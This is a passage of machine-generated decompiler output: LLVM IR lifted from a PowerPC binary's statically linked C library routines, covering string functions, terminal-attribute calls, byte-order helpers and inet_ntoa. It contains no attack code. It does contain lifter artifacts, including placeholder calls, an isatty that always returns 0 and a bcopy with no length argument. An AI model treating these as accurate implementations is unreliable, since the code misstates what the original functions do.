  %v2_1000f1d0 = and i32 %v4_1000f1cc, %v0_1000f1d0
  store i32 %v2_1000f1d0, i32* @r29, align 4
  %v0_1000f1d4 = call i32 @__GI_strlen()
  %v1_1000f1d8 = add i32 %v0_1000f1d4, 1
  store i32 %v1_1000f1d8, i32* %r31.global-to-local, align 4
  %v1_1000f1dc = load i32, i32* @r29, align 4
  %v3_1000f1dc = icmp ugt i32 %v1_1000f1d8, %v1_1000f1dc
  br i1 %v3_1000f1dc, label %dec_label_pc_1000f1e4, label %dec_label_pc_1000f1ec

dec_label_pc_1000f1e4:                            ; preds = %dec_label_pc_1000f1bc
  store i32 %v1_1000f1dc, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000f1ec

dec_label_pc_1000f1ec:                            ; preds = %dec_label_pc_1000f1bc, %dec_label_pc_1000f1e4
  %v0_1000f1fc = phi i32 [ %v1_1000f1dc, %dec_label_pc_1000f1e4 ], [ %v1_1000f1d8, %dec_label_pc_1000f1bc ]
  %v3_1000f1ec = icmp eq i32 %v0_1000f1fc, 0
  br i1 %v3_1000f1ec, label %dec_label_pc_1000f210, label %dec_label_pc_1000f1f4

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1ec
  %v0_1000f1f4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000f1f4, i32* @r4, align 4
  %v0_1000f1f8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000f1f8, i32* @r3, align 4
  store i32 %v0_1000f1fc, i32* @r5, align 4
  store i32 268497412, i32* @lr, align 4
  %v0_1000f200 = call i32 @memcpy()
  %v1_1000f204 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000f204 = add i32 %v1_1000f204, %v0_1000f1f8
  %v3_1000f20c = add i32 %v2_1000f204, -1
  %v4_1000f20c = inttoptr i32 %v3_1000f20c to i8*
  store i8 0, i8* %v4_1000f20c, align 1
  br label %dec_label_pc_1000f210

dec_label_pc_1000f210:                            ; preds = %dec_label_pc_1000f1ec, %dec_label_pc_1000f1f4
  %v0_1000f210 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000f210 = icmp eq i32 %v0_1000f210, 0
  br i1 %v3_1000f210, label %dec_label_pc_1000f220, label %dec_label_pc_1000f218

dec_label_pc_1000f218:                            ; preds = %dec_label_pc_1000f210
  %v0_1000f218 = call i32 @__errno_location()
  %v0_1000f21c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000f21c = inttoptr i32 %v0_1000f218 to i32*
  store i32 %v0_1000f21c, i32* %v2_1000f21c, align 4
  %v0_1000f224.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000f220

dec_label_pc_1000f220:                            ; preds = %dec_label_pc_1000f210, %dec_label_pc_1000f218
  %v0_1000f224 = phi i32 [ 0, %dec_label_pc_1000f210 ], [ %v0_1000f224.pre, %dec_label_pc_1000f218 ]
  ret i32 %v0_1000f224

; uselistorder directives
  uselistorder i32 %v2_1000f1c8, { 1, 0 }
  uselistorder i32 %v4_1000f1bc, { 1, 0 }
  uselistorder i32 %v1_1000f1c4, { 1, 2, 0 }
  uselistorder i32 %v1_1000f160, { 1, 0 }
  uselistorder i32 %v0_1000f12c, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1001725c.641 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f220, { 1, 0 }
  uselistorder label %dec_label_pc_1000f210, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f15c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000f244 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000f244
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000f24c = load i32, i32* bitcast (i32** @global_var_100287cc.644 to i32*), align 4
  %v0_1000f254.pre = load i32, i32* @r3, align 4
  %v1_1000f254.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000f254

dec_label_pc_1000f254:                            ; preds = %dec_label_pc_1000f27c, %entry
  %v0_1000f2906 = phi i32 [ %v0_1000f2907, %dec_label_pc_1000f27c ], [ 0, %entry ]
  %v0_1000f280 = phi i32 [ %v1_1000f280, %dec_label_pc_1000f27c ], [ %v1_1000f254.pre, %entry ]
  %v0_1000f284 = phi i32 [ %v1_1000f284, %dec_label_pc_1000f27c ], [ %v0_1000f254.pre, %entry ]
  %v4_1000f254 = icmp eq i32 %v0_1000f284, %v0_1000f280
  %.pre = inttoptr i32 %v0_1000f284 to i8*
  br i1 %v4_1000f254, label %dec_label_pc_1000f27c, label %dec_label_pc_1000f25c

dec_label_pc_1000f25c:                            ; preds = %dec_label_pc_1000f254
  %v2_1000f25c = load i8, i8* %.pre, align 1
  %v3_1000f25c = zext i8 %v2_1000f25c to i32
  %v1_1000f260 = inttoptr i32 %v0_1000f280 to i8*
  %v2_1000f260 = load i8, i8* %v1_1000f260, align 1
  %v3_1000f260 = zext i8 %v2_1000f260 to i32
  %v1_1000f264 = mul nuw nsw i32 %v3_1000f25c, 2
  %v1_1000f268 = mul nuw nsw i32 %v3_1000f260, 2
  %v2_1000f26c = add i32 %v1_1000f264, %v3_1000f24c
  %v3_1000f26c = inttoptr i32 %v2_1000f26c to i16*
  %v4_1000f26c = load i16, i16* %v3_1000f26c, align 2
  %v5_1000f26c = sext i16 %v4_1000f26c to i32
  %v2_1000f270 = add i32 %v1_1000f268, %v3_1000f24c
  %v3_1000f270 = inttoptr i32 %v2_1000f270 to i16*
  %v4_1000f270 = load i16, i16* %v3_1000f270, align 2
  %v5_1000f270 = sext i16 %v4_1000f270 to i32
  %v2_1000f274 = sub nsw i32 %v5_1000f26c, %v5_1000f270
  %v4_1000f278 = icmp eq i16 %v4_1000f26c, %v4_1000f270
  br i1 %v4_1000f278, label %dec_label_pc_1000f27c, label %dec_label_pc_1000f290

dec_label_pc_1000f27c:                            ; preds = %dec_label_pc_1000f254, %dec_label_pc_1000f25c
  %v0_1000f2907 = phi i32 [ %v2_1000f274, %dec_label_pc_1000f25c ], [ %v0_1000f2906, %dec_label_pc_1000f254 ]
  %v2_1000f27c = load i8, i8* %.pre, align 1
  %v1_1000f280 = add i32 %v0_1000f280, 1
  %v1_1000f284 = add i32 %v0_1000f284, 1
  %v3_1000f288 = icmp eq i8 %v2_1000f27c, 0
  br i1 %v3_1000f288, label %dec_label_pc_1000f290, label %dec_label_pc_1000f254

dec_label_pc_1000f290:                            ; preds = %dec_label_pc_1000f27c, %dec_label_pc_1000f25c
  %v0_1000f290 = phi i32 [ %v0_1000f2907, %dec_label_pc_1000f27c ], [ %v2_1000f274, %dec_label_pc_1000f25c ]
  ret i32 %v0_1000f290

; uselistorder directives
  uselistorder i32 %v2_1000f274, { 1, 0 }
  uselistorder i32 %v0_1000f284, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f27c, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000f2a0 = load i32, i32* bitcast (i32** @global_var_100287cc.644 to i32*), align 4
  store i32 %v3_1000f2a0, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f2a8

dec_label_pc_1000f2a8:                            ; preds = %dec_label_pc_1000f2a8.backedge, %entry
  %v0_1000f2a8 = phi i32 [ %v0_1000f2a8.pre, %dec_label_pc_1000f2a8.backedge ], [ %arg2, %entry ]
  %v1_1000f2a8 = inttoptr i32 %v0_1000f2a8 to i8*
  %v2_1000f2a8 = load i8, i8* %v1_1000f2a8, align 1
  %v3_1000f2a8 = zext i8 %v2_1000f2a8 to i32
  store i32 %v3_1000f2a8, i32* %r0.global-to-local, align 4
  %v1_1000f2ac = add i32 %v0_1000f2a8, 1
  store i32 %v1_1000f2ac, i32* %r10.global-to-local, align 4
  %v3_1000f2b0 = icmp eq i8 %v2_1000f2a8, 0
  %v1_1000f2b4 = mul nuw nsw i32 %v3_1000f2a8, 2
  store i32 %v1_1000f2b4, i32* %r9.global-to-local, align 4
  %v0_1000f2b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f2b0, i32 %v0_1000f2b8)
  %v0_1000f2bc = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f2bc = inttoptr i32 %v0_1000f2bc to i8*
  %v2_1000f2bc = load i8, i8* %v1_1000f2bc, align 1
  %v3_1000f2bc = zext i8 %v2_1000f2bc to i32
  %v1_1000f2c0 = add i32 %v0_1000f2bc, 1
  store i32 %v1_1000f2c0, i32* %r8.global-to-local, align 4
  %v0_1000f2c4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000f2c4 = icmp eq i32 %v0_1000f2c4, %v3_1000f2bc
  br i1 %v4_1000f2c4, label %dec_label_pc_1000f2a8.backedge, label %dec_label_pc_1000f2d0

dec_label_pc_1000f2a8.backedge:                   ; preds = %dec_label_pc_1000f2a8, %dec_label_pc_1000f2d0, %dec_label_pc_1000f2e4
  %v0_1000f2a8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f2a8

dec_label_pc_1000f2d0:                            ; preds = %dec_label_pc_1000f2a8
  %v1_1000f2c8 = mul nuw nsw i32 %v3_1000f2bc, 2
  %v0_1000f2d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f2d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000f2d0 = add i32 %v1_1000f2d0, %v0_1000f2d0
  %v3_1000f2d0 = inttoptr i32 %v2_1000f2d0 to i16*
  %v4_1000f2d0 = load i16, i16* %v3_1000f2d0, align 2
  %v5_1000f2d0 = sext i16 %v4_1000f2d0 to i32
  store i32 %v5_1000f2d0, i32* %r9.global-to-local, align 4
  %v2_1000f2d8 = add i32 %v1_1000f2d0, %v1_1000f2c8
  %v3_1000f2d8 = inttoptr i32 %v2_1000f2d8 to i16*
  %v4_1000f2d8 = load i16, i16* %v3_1000f2d8, align 2
  %v5_1000f2d8 = sext i16 %v4_1000f2d8 to i32
  store i32 %v5_1000f2d8, i32* %r0.global-to-local, align 4
  %v4_1000f2dc = icmp eq i16 %v4_1000f2d0, %v4_1000f2d8
  br i1 %v4_1000f2dc, label %dec_label_pc_1000f2a8.backedge, label %dec_label_pc_1000f2e4

dec_label_pc_1000f2e4:                            ; preds = %dec_label_pc_1000f2d0
  %v3_1000f2d4 = icmp eq i8 %v2_1000f2bc, 0
  %v0_1000f2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f2e4 = add i32 %v0_1000f2e4, 1
  store i32 %v1_1000f2e4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000f2e4, i32* %r8.global-to-local, align 4
  br i1 %v3_1000f2d4, label %dec_label_pc_1000f2f4, label %dec_label_pc_1000f2a8.backedge

dec_label_pc_1000f2f4:                            ; preds = %dec_label_pc_1000f2e4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000f2a8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f2a8.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10028810.645 to i32), i32* @r5, align 4
  %v1_1000f304 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10028810.645 to i32))
  ret i32 %v1_1000f304
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268497692, i32* @lr, align 4
  %v2_1000f318 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000f338 = load i32, i32* @lr, align 4
  store i32 %v0_1000f338, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000f348 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268497756, i32* @lr, align 4
  %v3_1000f358 = call i32 @ioctl(i32 1076655123, i32 %v2_1000f348, i32 %v2_1000f348)
  %v2_1000f35c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000f35c, i32* @r4, align 4
  store i32 %v3_1000f358, i32* @r30, align 4
  %v3_1000f360 = icmp eq i32 %v3_1000f358, 0
  store i32 19, i32* @r5, align 4
  %v0_1000f368 = load i32, i32* @r31, align 4
  br i1 %v3_1000f360, label %dec_label_pc_1000f370, label %dec_label_pc_1000f3b8

dec_label_pc_1000f370:                            ; preds = %entry
  %v1_1000f368 = add i32 %v0_1000f368, 17
  %v4_1000f37c = zext i8 %tmp4 to i32
  store i32 %v4_1000f37c, i32* @r8, align 4
  %v3_1000f388 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000f388, i32* %r0.global-to-local, align 4
  %v2_1000f38c = add i32 %v0_1000f368, 4
  %v3_1000f38c = inttoptr i32 %v2_1000f38c to i32*
  store i32 %tmp7, i32* %v3_1000f38c, align 4
  %v0_1000f390 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f390 = load i32, i32* @r31, align 4
  %v2_1000f390 = inttoptr i32 %v1_1000f390 to i32*
  store i32 %v0_1000f390, i32* %v2_1000f390, align 4
  %v0_1000f394 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f394 = load i32, i32* @r31, align 4
  %v2_1000f394 = add i32 %v1_1000f394, 8
  %v3_1000f394 = inttoptr i32 %v2_1000f394 to i32*
  store i32 %v0_1000f394, i32* %v3_1000f394, align 4
  %v0_1000f398 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f398 = load i32, i32* @r31, align 4
  %v2_1000f398 = add i32 %v1_1000f398, 12
  %v3_1000f398 = inttoptr i32 %v2_1000f398 to i32*
  store i32 %v0_1000f398, i32* %v3_1000f398, align 4
  %v3_1000f39c = load i32, i32* @r31, align 4
  %v4_1000f39c = add i32 %v3_1000f39c, 16
  %v5_1000f39c = inttoptr i32 %v4_1000f39c to i8*
  store i8 %tmp4, i8* %v5_1000f39c, align 1
  %v1_1000f3a0 = load i32, i32* @r31, align 4
  %v2_1000f3a0 = add i32 %v1_1000f3a0, 52
  %v3_1000f3a0 = inttoptr i32 %v2_1000f3a0 to i32*
  store i32 %tmp3, i32* %v3_1000f3a0, align 4
  %v1_1000f3a4 = load i32, i32* @r31, align 4
  %v2_1000f3a4 = add i32 %v1_1000f3a4, 56
  %v3_1000f3a4 = inttoptr i32 %v2_1000f3a4 to i32*
  store i32 %tmp2, i32* %v3_1000f3a4, align 4
  store i32 268497836, i32* @lr, align 4
  %v6_1000f3a8 = sext i8 %tmp4 to i32
  %v8_1000f3a8 = call i32 @__GI_mempcpy(i32 %v1_1000f368, i32 %v2_1000f35c, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000f3a8, i32 %tmp7)
  store i32 268497848, i32* @lr, align 4
  %v3_1000f3b4 = call i32 @__GI_memset(i32 %v8_1000f3a8, i32 0, i32 13)
  %v0_1000f3bc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f3b8

dec_label_pc_1000f3b8:                            ; preds = %entry, %dec_label_pc_1000f370
  %v0_1000f3bc = phi i32 [ %v3_1000f358, %entry ], [ %v0_1000f3bc.pre, %dec_label_pc_1000f370 ]
  store i32 %v0_1000f338, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f3bc

; uselistorder directives
  uselistorder i32 %v2_1000f348, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f3b8, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000f3d0 = load i32, i32* @r4, align 4
  %v3_1000f3d0 = icmp eq i32 %v0_1000f3d0, 1
  %v0_1000f3e0 = load i32, i32* @r3, align 4
  store i32 %v0_1000f3e0, i32* @r27, align 4
  %v0_1000f3e8 = load i32, i32* @r5, align 4
  store i32 %v0_1000f3e8, i32* @r31, align 4
  br i1 %v3_1000f3d0, label %dec_label_pc_1000f40c, label %dec_label_pc_1000f3f0

dec_label_pc_1000f3f0:                            ; preds = %entry
  %v3_1000f3f0 = icmp eq i32 %v0_1000f3d0, 2
  br i1 %v3_1000f3f0, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f3f8

dec_label_pc_1000f3f8:                            ; preds = %dec_label_pc_1000f3f0
  %v3_1000f3f8 = icmp eq i32 %v0_1000f3d0, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000f3f8, label %dec_label_pc_1000f434, label %dec_label_pc_1000f418

dec_label_pc_1000f40c:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000f434

dec_label_pc_1000f418:                            ; preds = %dec_label_pc_1000f3f8
  %v0_1000f418 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000f424 = inttoptr i32 %v0_1000f418 to i32*
  store i32 22, i32* %v2_1000f424, align 4
  br label %dec_label_pc_1000f51c

dec_label_pc_1000f42c:                            ; preds = %dec_label_pc_1000f3f0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000f434

dec_label_pc_1000f434:                            ; preds = %dec_label_pc_1000f3f8, %dec_label_pc_1000f40c, %dec_label_pc_1000f42c
  %v1_1000f434 = inttoptr i32 %v0_1000f3e8 to i32*
  %v2_1000f434 = load i32, i32* %v1_1000f434, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000f43c = add i32 %v0_1000f3e8, 4
  %v2_1000f43c = inttoptr i32 %v1_1000f43c to i32*
  %v3_1000f43c = load i32, i32* %v2_1000f43c, align 4
  store i32 %v3_1000f43c, i32* %r9.global-to-local, align 4
  %v1_1000f440 = add i32 %v0_1000f3e8, 17
  store i32 %v1_1000f440, i32* @r4, align 4
  %v1_1000f444 = add i32 %v0_1000f3e8, 8
  %v2_1000f444 = inttoptr i32 %v1_1000f444 to i32*
  %v3_1000f444 = load i32, i32* %v2_1000f444, align 4
  %v2_1000f448 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000f448, i32* @r3, align 4
  %v2_1000f450 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000f450, i32* @r26, align 4
  %v1_1000f454 = add i32 %v0_1000f3e8, 16
  %v2_1000f454 = inttoptr i32 %v1_1000f454 to i8*
  %v3_1000f454 = load i8, i8* %v2_1000f454, align 1
  %v4_1000f454 = zext i8 %v3_1000f454 to i32
  store i32 %v4_1000f454, i32* @r8, align 4
  store i32 %v2_1000f434, i32* %stack_var_-72, align 4
  store i32 268498048, i32* @lr, align 4
  %v0_1000f47c = call i32 @memcpy()
  %v0_1000f480 = load i32, i32* @r27, align 4
  %v0_1000f484 = load i32, i32* @r30, align 4
  store i32 268498068, i32* @lr, align 4
  %v3_1000f490 = call i32 @ioctl(i32 %v0_1000f480, i32 %v0_1000f484, i32 %v2_1000f450)
  store i32 %v3_1000f490, i32* @r28, align 4
  %v3_1000f494 = icmp eq i32 %v3_1000f490, 0
  br i1 %v3_1000f494, label %dec_label_pc_1000f49c, label %dec_label_pc_1000f51c

dec_label_pc_1000f49c:                            ; preds = %dec_label_pc_1000f434
  %v0_1000f49c = load i32, i32* @r30, align 4
  %v3_1000f4a0 = icmp eq i32 %v0_1000f49c, -2144570348
  br i1 %v3_1000f4a0, label %dec_label_pc_1000f4a8, label %dec_label_pc_1000f518

dec_label_pc_1000f4a8:                            ; preds = %dec_label_pc_1000f49c
  %v0_1000f4a8 = call i32 @__errno_location()
  store i32 %v0_1000f4a8, i32* @r29, align 4
  %v0_1000f4b8 = load i32, i32* @r27, align 4
  %v1_1000f4c0 = inttoptr i32 %v0_1000f4a8 to i32*
  %v2_1000f4c0 = load i32, i32* %v1_1000f4c0, align 4
  store i32 %v2_1000f4c0, i32* @r30, align 4
  store i32 268498124, i32* @lr, align 4
  %v3_1000f4c8 = call i32 @ioctl(i32 %v0_1000f4b8, i32 1076655123, i32 %v2_1000f450)
  %v3_1000f4cc = icmp eq i32 %v3_1000f4c8, 0
  br i1 %v3_1000f4cc, label %dec_label_pc_1000f4dc, label %dec_label_pc_1000f4d4

dec_label_pc_1000f4d4:                            ; preds = %dec_label_pc_1000f4a8
  %v0_1000f4d4 = load i32, i32* @r30, align 4
  %v1_1000f4d4 = load i32, i32* @r29, align 4
  %v2_1000f4d4 = inttoptr i32 %v1_1000f4d4 to i32*
  store i32 %v0_1000f4d4, i32* %v2_1000f4d4, align 4
  br label %dec_label_pc_1000f51c

dec_label_pc_1000f4dc:                            ; preds = %dec_label_pc_1000f4a8
  %v0_1000f4dc = load i32, i32* @r31, align 4
  %v1_1000f4dc = add i32 %v0_1000f4dc, 8
  %v2_1000f4dc = inttoptr i32 %v1_1000f4dc to i32*
  %v3_1000f4dc = load i32, i32* %v2_1000f4dc, align 4
  %v1_1000f4e4 = call i32 @__asm_rlwinm(i32 %v3_1000f4dc, i32 0, i32 19, i32 20)
  %v1_1000f4e8 = call i32 @__asm_rlwinm(i32 %v3_1000f444, i32 0, i32 19, i32 20)
  store i32 %v1_1000f4e8, i32* %r9.global-to-local, align 4
  %v4_1000f4ec = icmp eq i32 %v1_1000f4e4, %v1_1000f4e8
  br i1 %v4_1000f4ec, label %dec_label_pc_1000f4f4, label %dec_label_pc_1000f508

dec_label_pc_1000f4f4:                            ; preds = %dec_label_pc_1000f4dc
  %v1_1000f4f4 = and i32 %v3_1000f4dc, 768
  store i32 %v1_1000f4f4, i32* %r9.global-to-local, align 4
  %v3_1000f4f4 = icmp eq i32 %v1_1000f4f4, 0
  br i1 %v3_1000f4f4, label %dec_label_pc_1000f518, label %dec_label_pc_1000f4fc

dec_label_pc_1000f4fc:                            ; preds = %dec_label_pc_1000f4f4
  %v1_1000f4fc = call i32 @__asm_rlwinm(i32 %v3_1000f444, i32 0, i32 22, i32 23)
  %v0_1000f500 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000f500 = icmp eq i32 %v0_1000f500, %v1_1000f4fc
  br i1 %v4_1000f500, label %dec_label_pc_1000f518, label %dec_label_pc_1000f508

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f4dc, %dec_label_pc_1000f4fc
  store i32 -1, i32* @r28, align 4
  %v1_1000f510 = load i32, i32* @r29, align 4
  %v2_1000f510 = inttoptr i32 %v1_1000f510 to i32*
  store i32 22, i32* %v2_1000f510, align 4
  br label %dec_label_pc_1000f51c

dec_label_pc_1000f518:                            ; preds = %dec_label_pc_1000f49c, %dec_label_pc_1000f4fc, %dec_label_pc_1000f4f4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000f51c

dec_label_pc_1000f51c:                            ; preds = %dec_label_pc_1000f434, %dec_label_pc_1000f4d4, %dec_label_pc_1000f418, %dec_label_pc_1000f508, %dec_label_pc_1000f518
  %v0_1000f520 = load i32, i32* @r28, align 4
  ret i32 %v0_1000f520

; uselistorder directives
  uselistorder i32 %v0_1000f3e8, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000f51c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f518, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f508, { 1, 0 }
  uselistorder label %dec_label_pc_1000f434, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000f534 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f534
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000f538 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f538
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000f53c = load i32, i32* @r3, align 4
  ret i32 %v0_1000f53c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000f540 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f540
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000f54c = add i32 %arg2, 15
  store i32 %v1_1000f54c, i32* %r4.global-to-local, align 4
  %v2_1000f560 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f560, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f568

dec_label_pc_1000f568:                            ; preds = %dec_label_pc_1000f58c.dec_label_pc_1000f568_crit_edge, %entry
  %v0_1000f568 = phi i32 [ %v2_1000f560, %entry ], [ %v0_1000f568.pre, %dec_label_pc_1000f58c.dec_label_pc_1000f568_crit_edge ]
  %v0_1000f5ac8 = phi i32 [ %v1_1000f54c, %entry ], [ %v0_1000f58c, %dec_label_pc_1000f58c.dec_label_pc_1000f568_crit_edge ]
  %v1_1000f568 = urem i32 %v0_1000f568, 256
  %v5_1000f570 = inttoptr i32 %v0_1000f5ac8 to i8*
  %v6_1000f570 = call i32 @_uintmaxtostr(i8* %v5_1000f570, i32 0, i32 %v1_1000f568, i32 -10, i32 0)
  %v0_1000f574 = load i32, i32* @r30, align 4
  %v3_1000f574 = icmp eq i32 %v0_1000f574, 0
  %v0_1000f578 = load i32, i32* @r31, align 4
  %v1_1000f578 = udiv i32 %v0_1000f578, 256
  store i32 %v1_1000f578, i32* %r31.global-to-local, align 4
  %v1_1000f57c = add i32 %v6_1000f570, -1
  store i32 %v1_1000f57c, i32* %r4.global-to-local, align 4
  br i1 %v3_1000f574, label %dec_label_pc_1000f58c, label %dec_label_pc_1000f584

dec_label_pc_1000f584:                            ; preds = %dec_label_pc_1000f568
  %v3_1000f588 = inttoptr i32 %v0_1000f574 to i8*
  store i8 46, i8* %v3_1000f588, align 1
  %v0_1000f58c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f58c

dec_label_pc_1000f58c:                            ; preds = %dec_label_pc_1000f568, %dec_label_pc_1000f584
  %v0_1000f58c = phi i32 [ %v1_1000f57c, %dec_label_pc_1000f568 ], [ %v0_1000f58c.pre, %dec_label_pc_1000f584 ]
  %v0_1000f590.pre = load i32, i32* @r29, align 4
  %v1_1000f5a0 = add i32 %v0_1000f590.pre, 1
  store i32 %v1_1000f5a0, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000f590.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000f58c.dec_label_pc_1000f568_crit_edge, label %dec_label_pc_1000f5a8

dec_label_pc_1000f58c.dec_label_pc_1000f568_crit_edge: ; preds = %dec_label_pc_1000f58c
  %v0_1000f568.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f568

dec_label_pc_1000f5a8:                            ; preds = %dec_label_pc_1000f58c
  %v1_1000f5ac = add i32 %v0_1000f58c, 1
  ret i32 %v1_1000f5ac

; uselistorder directives
  uselistorder i32 %v0_1000f590.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f58c, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000f5d4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f5d4, i32* %stack_var_-8, align 4
  store i32 268498404, i32* @lr, align 4
